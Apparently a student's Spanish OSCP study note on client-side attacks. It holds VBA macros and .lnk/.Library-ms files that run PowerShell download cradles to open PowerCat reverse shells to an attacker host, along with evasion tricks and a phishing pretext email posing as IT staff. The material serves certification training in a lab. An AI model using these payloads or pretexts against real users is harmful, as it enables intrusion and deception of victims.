---
tipo: modulo
modulo: 12
estado: repasado
tags:
  - oscp
  - explotacion
  - phishing
  - client-side
  - windows
fecha: 2026-09-29
---

# 12 - Client-side Attacks

> [!abstract] Resumen
> **Ataques del lado del cliente**: entregar un fichero/enlace malicioso a un usuario para que lo ejecute y nos dé el **foothold** inicial en la red interna (la máquina cliente no está expuesta, no tiene servicios externos → hay que engañar a la persona). Es el vector real más habitual hoy junto a los ataques de credenciales.
> Tres bloques: **(1) Reconocimiento del target** (metadatos con `exiftool`, *client fingerprinting* con Canarytokens para saber SO/navegador sin tocar la máquina); **(2) Explotación de Microsoft Office** (macros VBA que lanzan una reverse shell con PowerCat, sorteando MotW/Protected View/bloqueo de macros); **(3) Windows Library Files** (`.Library-ms` que apunta a un WebDAV como primera etapa + un `.lnk` en el share como segunda etapa → reverse shell).
> Hilo conductor: el payload **debe coincidir** con el SO y software del target (por eso el recon primero), y siempre hace falta un **pretexto** creíble para que la víctima haga doble clic.

## Conceptos clave
- **Client-side attack**: se explota software local del cliente (navegador, componentes de Windows, Office). Requiere **persuadir** al usuario para ejecutar el payload → factor humano, no solo técnico.
- **El recon va primero**: hay que saber SO + apps instaladas antes de elegir el payload. Windows → JScript/WSH, `.lnk`, `.Library-ms`; con Office → macros.
- **Metadatos de documentos públicos**: autor, fechas, SO y versión del software que creó el fichero. Recon **hands-off** (sin tocar al target, sin trazas), pero puede estar desactualizado.
- **Client fingerprinting** (device fingerprinting): obtener SO/navegador/IP de un target en red no enrutable haciéndole abrir un enlace (Canarytokens). El **user agent** es orientativo (se puede falsear); el **JavaScript fingerprinting** embebido es más fiable.
- **Pretexto**: la excusa que hace clicar el enlace/abrir el fichero. Se apoya en el rol del target (ej. finanzas → "factura con un error").
- **Macros VBA**: acceso completo a objetos ActiveX y al Windows Script Host. Vector clásico y aún efectivo.
- **Defensas de Office a sortear**: **MotW** (Mark of the Web) → **Protected View** (deshabilita edición y bloquea macros) → *Enable Editing*; y el **bloqueo de macros por defecto** en ficheros con MotW (ya no basta *Enable Content*, hay que *Unblock* en Propiedades).
- **Windows Library files** (`.Library-ms`): contenedores XML que conectan al usuario con ubicaciones remotas (WebDAV/SMB). Los **filtros de spam suelen dejarlos pasar** (a diferencia de un enlace a un `.lnk`), y al abrirlos parecen una carpeta local → excelente **primera etapa**.

> [!tip] Idea para el examen
> El patrón repetido de la reverse shell es un **download cradle de PowerShell + PowerCat**, codificado o no:
> `IEX(New-Object System.Net.WebClient).DownloadString('http://KALI/powercat.ps1');powercat -c KALI -p 4444 -e powershell`
> Del lado Kali: servidor web (`python3 -m http.server`) con `powercat.ps1` + listener `nc -nvlp 4444`. Cambia según el vector: en **macro** va base64-encoded (UTF-16LE) y troceado en strings <255 chars; en **`.lnk`** va en claro como argumento de `powershell.exe -c`.

---

## 12.1 Target reconnaissance

### 12.1.1 Information gathering — metadatos
Objetivo: enumerar el software instalado **sin interactuar** con la máquina del target (sin alertar SIEM ni dejar trazas).

- Buscar documentos públicos de la org y leer sus **metadatos**. Dork de Google: `site:example.com filetype:pdf` (añadir keywords para filtrar por sucursal/ubicación). Alternativa activa (ruidosa, deja logs): `gobuster ... -x pdf,docx`.
- `exiftool` sobre el fichero descargado muestra los tags:

```bash
cd Downloads
exiftool -a -u brochure.pdf     # -a: tags duplicados  -u: tags desconocidos
```

Lo relevante del output:

| Tag | Qué nos dice |
|---|---|
| `Create Date` / `Modify Date` | Antigüedad del documento (fechas recientes → metadatos fiables) |
| `Author` / `Creator` | Nombre de un **empleado interno** → reforzar el pretexto (soltar su nombre en un email/llamada) |
| `Producer` / `Creator Tool` | Software y versión (ej. *Microsoft PowerPoint for Microsoft 365*) → confirma que usan **Office** |
| (ausencia de "macOS"/"for Mac") | Muy probable que sea **Windows** |

> [!tip] Con `Producer: Microsoft ... 365` y sin rastro de Mac, ya sabemos que podemos ir a por **documentos Office maliciosos** o **componentes de Windows**.

### 12.1.2 Client fingerprinting (Canarytokens)
Cuando no tenemos conexión directa: hacer que el target abra un enlace y que **su navegador nos delate** SO/navegador/IP. Sirve para **confirmar** que corre Windows + IE/Edge antes de lanzar, por ejemplo, un ataque **HTA**.

Flujo con [Canarytokens](https://canarytokens.org) (gratis):
1. Elegir **Web bug / URL token** en el desplegable. Poner un email de alerta o webhook (ej. `https://example.com`) y un comentario (`Fingerprinting`) → **Create my Canarytoken**.
2. Se genera un **enlace de tracking**. *Manage this token* → ajustes; *History* → visitantes.
3. Enviar el enlace con un **pretexto** (ej. finanzas: "esta factura tiene un error, aquí el screenshot"). La víctima ve una **página en blanco**; a nosotros nos aparece una entrada en *History*.

En el detalle de la visita (ver `img09`):

| Dato | Fuente | Fiabilidad |
|---|---|---|
| **User-Agent** (ej. `...Mac OS X 10_15_7... Chrome/133...`) | cabecera del navegador | baja (se puede modificar) |
| **SO / navegador precisos** | **JavaScript fingerprinting** embebido en la página del token | alta |
| IP, geolocalización, organización (ASN) | conexión HTTP | media |

- Se puede exportar la entrada como **CSV** o **JSON**.
- Canarytokens también embebe el token en **Word/PDF/imagen** (avisa cuando se abre el fichero). Alternativas: **Grabify** (IP logger), **fingerprint.js** (librería JS).

> [!warning] En el ejemplo el target resultó ser **Chrome sobre macOS**, no Windows+IE/Edge. Si el fingerprint no encaja con el payload → **cambiar de vector** o **cambiar el pretexto** (ej. "el screenshot solo se ve en Internet Explorer/Edge").

---

## 12.2 Exploiting Microsoft Office

### 12.2.1 Preparing the attack — 3 consideraciones
1. **Entrega**: los filtros de correo suelen **bloquear todos los adjuntos Office** por defecto. Mejor entregarlos con un **enlace de descarga** + pretexto.
2. **Mark of the Web (MotW)**: cualquier fichero descargado de Internet se abre en **Protected View** (sin edición, sin macros, sin objetos embebidos). La víctima ve un aviso con **Enable Editing** (ver `img12`). El bypass básico: convencerla de pulsarlo (ej. desenfocar el documento y pedir que lo "desbloquee"). Programas macro-enabled sin Protected View: **Microsoft Publisher** (menos instalado).
3. **Bloqueo de macros por defecto**: cambio de Microsoft que afecta a Access, Excel, PowerPoint, Visio y Word (retroactivo hasta Office 2013). Ya **no** aparece *Enable Content*; sale un aviso rojo *"Microsoft has blocked macros... the source of this file is untrusted"* con botón **Learn More** (ver `img14`). Ahora hay que convencer a la víctima de marcar **Unblock** en *Propiedades* del fichero.

> [!important] Pese a todas las mitigaciones y la concienciación, las **macros maliciosas siguen siendo uno de los vectores client-side más comunes**. Cada defensa nueva empuja a los atacantes a un bypass nuevo (espiral defensor↔atacante).

### 12.2.2 Installing Microsoft Office (lab)
- RDP a la máquina **OFFICE** (VM #1) con `offsec` / `lab`. En Windows 11 el **NLA** está activo por defecto y `rdesktop` no conecta a máquinas no unidas a dominio → usar **`xfreerdp`** (soporta NLA fuera de dominio).
- Montar `C:\tools\Office2019.img` (doble clic → Open → carga como CD virtual) y ejecutar `Setup.exe`. Al abrir Word: cerrar el popup (trial de 7 días) → *Accept* la licencia → *No, don't send optional data* → *Done*.

### 12.2.3 Leveraging Microsoft Word macros
Objetivo: macro VBA que lanza una **reverse shell** al abrir el documento. Ver nota atómica → [[Macros VBA Maliciosas (Office)]].

**Formato del fichero**: guardar como **`.doc`** (o `.docm`). Un `.docx` **no** guarda macros embebidas (necesitaría una plantilla adjunta). En el diálogo de macros, elegir el **documento actual** (`Document1`), no la plantilla global, o la macro no viaja con el fichero.

**Ejecución automática**: las macros no corren solas → usar `AutoOpen()` y `Document_Open()` (cubren casos distintos según cómo se abra Word/el documento; se usan **ambos**), que llaman a la nuestra.

**Primer PoC** (abre PowerShell vía ActiveX / Windows Script Host):
```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

**Reverse shell con PowerCat** (download cradle base64-encoded). Comando en claro:
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```

Se codifica en **base64 UTF-16LE** con `pwsh` en Kali (otro charset **no funciona**). VBA tiene un **límite de 255 chars** en strings literales → trocear con Python y concatenar en la variable `Str`:
```python
str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

Macro final (troceada):
```vba
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
    ' ...resto de chunks...
    CreateObject("Wscript.Shell").Run Str
End Sub
```

Del lado Kali: `python3 -m http.server` en el dir de `powercat.ps1` + `nc -nvlp 4444`. Al abrir el documento salta la reverse shell.

> [!warning] El aviso de *Enable Content* **solo reaparece si cambia el nombre del documento** (Office recuerda la decisión por nombre). Flags de PowerShell: `-nop` (no profile), `-w hidden` (ventana oculta), `-enc` (comando base64).

> [!important] `.docx` puede **ejecutar** macros pero no **guardarlas** embebidas → usar `.doc`/`.docm`. Vectores viejos como **DDE** y **OLE** ya no funcionan de forma fiable sin modificar el sistema.

---

## 12.3 Abusing Windows library files

Ataque en **dos etapas** (ver nota atómica → [[Windows Library Files (.Library-ms)]]):
- **Etapa 1**: la víctima abre un `.Library-ms` (llega por email/SMB). Al doble clic, monta un **WebDAV** nuestro y lo muestra como una carpeta local normal.
- **Etapa 2**: dentro de esa "carpeta" hay un `.lnk` que, al doble clic, ejecuta el download cradle + PowerCat → reverse shell.

**Por qué library files y no un enlace directo al `.lnk`**: los filtros de spam analizan enlaces/adjuntos ejecutables y los bloquean, pero **suelen dejar pasar los `.Library-ms`**. Al abrirlo, Windows Explorer pinta la ubicación remota como si fuera local.

### 1) WebDAV con WsgiDAV (Kali)
```bash
sudo apt install python3-wsgidav
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
Comprobar en `http://127.0.0.1` (debe listar `test.txt`).

### 2) Crear el `.Library-ms` (en CLIENT137 vía RDP)
`xfreerdp` a 192.168.50.194 (`offsec`/`lab`). Crear con VS Code/Notepad un fichero `config.Library-ms`. XML completo:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

| Tag | Función | Para camuflar |
|---|---|---|
| `name` | Nombre de la librería vía DLL+índice | `@windows.storage.dll,-34582` (evitar `shell32` por filtros de texto) |
| `isLibraryPinned` | Fijar en el panel de navegación | `true` → parece más genuino |
| `iconReference` | Icono | `imageres.dll,-1003` (icono de **Pictures**, más benigno) |
| `folderType` GUID | Columnas/vista de Explorer | GUID de **Documents** `{7d49d726-...}` |
| `url` (en `simpleLocation`) | Ubicación remota | apunta al **WebDAV** de Kali |

> [!warning] Al abrir el `.Library-ms`, Windows lo **optimiza**: añade un tag `<serialized>` (base64) y cambia la `url` a `\\IP\DavWWWRoot` (ver `img29`). Eso puede hacer que **falle en otra máquina o tras reiniciar** (share vacío). Solución: **restaurar el XML original** (listing 17) antes de enviarlo. La barra de navegación solo muestra `config`, sin pista de que es remoto.

### 3) Crear el `.lnk` (segunda etapa)
Botón derecho en el escritorio → New → Shortcut. Como destino, el download cradle en claro:
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"
```
Nombre: `automatic_configuration`.

> [!tip] Si el target es técnico y puede inspeccionar el shortcut: poner un **delimitador + comando benigno** detrás del malicioso para **empujarlo fuera del área visible** en la ventana de Propiedades → solo verá lo benigno.

> [!important] Servir `powercat.ps1` desde un **servidor web Python** (no desde el WebDAV): el share WebDAV es de escritura y el AV podría **borrar/poner en cuarentena** el payload. Además, un WebDAV de solo lectura nos quitaría un buen canal de exfiltración.

### 4) Puesta en marcha y entrega
En Kali (3 terminales): `python3 -m http.server 8000` (con `powercat.ps1`), `wsgidav ... --root /home/kali/webdav`, `nc -nvlp 4444`. Copiar `automatic_configuration.lnk` y `config.Library-ms` al `/home/kali/webdav`, borrar `test.txt`.

Simular la entrega vía SMB (en real iría por email):
```bash
cd webdav
rm test.txt
smbclient //192.168.50.195/share -c 'put config.Library-ms'
```
La víctima abre el `.Library-ms` → ve la "carpeta" → doble clic en `automatic_configuration.lnk` → confirma la ventana → reverse shell:
```bash
nc -nvlp 4444
# ...
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
hr137\hsmith
```

> [!example] Pretexto de entrega (email)
> "Hola, soy Dwight, nuevo en el equipo de IT. Estoy completando unas configuraciones; adjunto un fichero que las hace automáticamente. ¿Puedes descargarlo, abrir la carpeta y hacer doble clic en *automatic_configuration*? Cuando confirmes la ventana, listo."

---

## Ejemplo práctico
> [!example] Flujo end-to-end de un client-side attack
> 1. **Recon**: `exiftool` sobre un PDF público → confirma Office/Windows + nombre de empleado. (Opcional) Canarytoken para verificar SO/navegador en vivo.
> 2. **Elegir vector** según el recon: macro Office o `.Library-ms`.
> 3. **Macro**: `.doc` con `AutoOpen`/`Document_Open` → download cradle base64 (UTF-16LE, troceado <255) + PowerCat.
> 4. **Library file**: `.Library-ms` → WebDAV (WsgiDAV) como etapa 1; `.lnk` con cradle en claro como etapa 2. Restaurar el XML antes de enviar.
> 5. **Kali**: `http.server` con `powercat.ps1` + `nc -nvlp 4444`.
> 6. **Entrega** con pretexto (email/SMB) → la víctima ejecuta → reverse shell.

## Relacionado
- Técnicas: [[Macros VBA Maliciosas (Office)]] · [[Windows Library Files (.Library-ms)]] · [[Google Dorks]]
- Cheatsheet: [[Explotacion y Shells]] · [[Enumeracion]]
- Módulo previo: [[11 - Phishing Basics]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - Repasar el ataque **HTA** (mencionado en fingerprinting pero no desarrollado aquí) — ¿en qué módulo/entra en examen?
> - Cómo obtener/servir `powercat.ps1` y montar el download cradle codificado con `pwsh` (repasar Common Web Application Attacks).
> - ¿Qué otros `folderType` GUID / iconos convienen para que el `.Library-ms` pase más desapercibido?
